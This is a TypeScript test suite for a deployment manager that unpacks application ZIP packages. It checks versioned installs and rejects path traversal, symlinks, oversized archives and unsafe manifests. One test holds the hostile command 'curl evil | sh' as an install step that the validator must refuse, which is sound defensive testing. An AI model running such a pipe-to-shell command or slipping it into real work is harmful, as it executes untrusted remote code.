import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, readFile, writeFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { DeploymentManager } from '../packages/adapter-process/src/deployment/deployment-manager.js';
import { validateApplicationManifest } from '../packages/adapter-process/src/deployment/application-package-validator.js';
import type { DependencyInstaller } from '../packages/adapter-process/src/deployment/application-installer.js';

function crc32(data: Buffer): number {
  let checksum = -1;
  for (const byte of data) {
    checksum ^= byte;
    for (let bit = 0; bit < 8; bit++) {
      checksum = (checksum >>> 1) ^ ((checksum & 1) ? 0xedb88320 : 0);
    }
  }
  return (checksum ^ -1) >>> 0;
}
function zip(files: Array<{ name: string; content: string; mode?: number }>): Buffer {
  const local: Buffer[] = [];
  const central: Buffer[] = [];
  let offset = 0;
  for (const file of files) {
    const name = Buffer.from(file.name);
    const data = Buffer.from(file.content);
    const localHeader = Buffer.alloc(30);
    localHeader.writeUInt32LE(0x04034b50, 0);
    localHeader.writeUInt16LE(20, 4);
    localHeader.writeUInt16LE(0x800, 6);
    localHeader.writeUInt32LE(crc32(data), 14);
    localHeader.writeUInt32LE(data.length, 18);
    localHeader.writeUInt32LE(data.length, 22);
    localHeader.writeUInt16LE(name.length, 26);
    local.push(localHeader, name, data);
    const centralHeader = Buffer.alloc(46);
    centralHeader.writeUInt32LE(0x02014b50, 0);
    centralHeader.writeUInt16LE(0x0314, 4);
    centralHeader.writeUInt16LE(20, 6);
    centralHeader.writeUInt16LE(0x800, 8);
    centralHeader.writeUInt32LE(crc32(data), 16);
    centralHeader.writeUInt32LE(data.length, 20);
    centralHeader.writeUInt32LE(data.length, 24);
    centralHeader.writeUInt16LE(name.length, 28);
    centralHeader.writeUInt32LE(( (file.mode ?? 0o100644) << 16) >>> 0, 38);
    centralHeader.writeUInt32LE(offset, 42);
    central.push(centralHeader, name);
    offset += localHeader.length + name.length + data.length;
  }
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(files.length, 8);
  end.writeUInt16LE(files.length, 10);
  end.writeUInt32LE(Buffer.concat(central).length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...local, ...central, end]);
}
function manifest(version = '1.0.0'): string {
  return JSON.stringify({
    schemaVersion: '1.0', applicationId: 'payment-api', version,
    runtime: { type: 'nodejs', nodeVersion: '>=22', entry: 'dist/main.js' },
    install: { strategy: 'npm-ci', buildRequired: false },
    arm: { enabled: true, metricsPort: 3101 },
    lifecycle: {
      autoStart: false, restartPolicy: 'on-failure', maxRestarts: 3,
      stopTimeoutMs: 10000,
    },
  });
}
function packageZip(version = '1.0.0', entryContent = 'console.log("hello")'): Buffer {
  return zip([
    { name: 'app.manifest.json', content: manifest(version) },
    { name: 'package.json', content: '{"name":"payment-api","version":"1.0.0"}' },
    { name: 'package-lock.json', content: '{"name":"payment-api","version":"1.0.0","lockfileVersion":3,"packages":{"":{"name":"payment-api","version":"1.0.0"}}}' },
    { name: 'dist/main.js', content: entryContent },
  ]);
}
class FakeInstaller implements DependencyInstaller {
  calls = 0;
  async install(): Promise<void> { this.calls++; }
}
async function workspace<T>(action: (root: string) => Promise<T>): Promise<T> {
  const root = await mkdtemp(join(tmpdir(), 'arm-deployment-'));
  try { return await action(root); }
  finally { await rm(root, { recursive: true, force: true }); }
}

test('installs ZIP into immutable versioned release and persists metadata', async () => {
  await workspace(async root => {
    const installer = new FakeInstaller();
    const manager = new DeploymentManager({ storageRoot: join(root, 'supervisor') }, installer);
    const archive = join(root, 'payment.zip');
    await writeFile(archive, packageZip());
    const first = await manager.installZip(archive);
    assert.equal(first.alreadyInstalled, false);
    assert.equal(first.release.applicationId, 'payment-api');
    assert.equal((await readFile(first.release.entry, 'utf8')), 'console.log("hello")');
    assert.equal(installer.calls, 1);
    assert.deepEqual(await manager.storage.listReleases('payment-api'), [first.release]);
    const second = await manager.installZip(archive);
    assert.equal(second.alreadyInstalled, true);
    assert.equal(installer.calls, 1);
    await writeFile(archive, packageZip('1.0.0', 'console.log("modified")'));
    await assert.rejects(manager.installZip(archive), /checksum conflict/);
    assert.equal(installer.calls, 1);
  });
});

test('rejects path traversal, ZIP symlinks and package bombs', async () => {
  await workspace(async root => {
    const manager = new DeploymentManager({
      storageRoot: join(root, 'supervisor'), maxExtractedBytes: 1024,
    }, new FakeInstaller());
    const archive = join(root, 'unsafe.zip');
    await writeFile(archive, zip([{ name: '../escape.js', content: 'evil' }]));
    await assert.rejects(manager.installZip(archive), /Unsafe archive entry path/);
    await writeFile(archive, zip([{ name: 'link', content: 'target', mode: 0o120777 }]));
    await assert.rejects(manager.installZip(archive), /symlink/);
    await writeFile(archive, zip([{ name: 'large.txt', content: 'x'.repeat(2048) }]));
    await assert.rejects(manager.installZip(archive), /size limit exceeded/);
  });
});
test('manifest rejects dangerous entry and arbitrary install commands', () => {
  assert.throws(() => validateApplicationManifest(JSON.parse(manifest().replace('dist/main.js', '../outside.js'))), /Invalid/);
  const data = JSON.parse(manifest()) as Record<string, unknown>;
  data.install = { strategy: 'shell', command: 'curl evil | sh', buildRequired: false };
  assert.throws(() => validateApplicationManifest(data), /Invalid/);
});
test('failed installation cleans staging without publishing a release', async () => {
  await workspace(async root => {
    const installer: DependencyInstaller = { async install() { throw new Error('npm ci failed'); } };
    const manager = new DeploymentManager({ storageRoot: join(root, 'data') }, installer);
    const archive = join(root, 'payment.zip');
    await writeFile(archive, packageZip());
    await assert.rejects(manager.installZip(archive), /npm ci failed/);
    assert.deepEqual(await manager.storage.listReleases('payment-api'), []);
  });
});
test('npm ci installs an offline no-dependency package with lifecycle scripts disabled', async () => {
  await workspace(async root => {
    const manager = new DeploymentManager({ storageRoot: join(root, 'deployed') });
    const archive = join(root, 'express.zip');
    await writeFile(archive, packageZip());
    const { release } = await manager.installZip(archive);
    assert.equal((await readFile(release.entry, 'utf8')), 'console.log("hello")');
  });
});
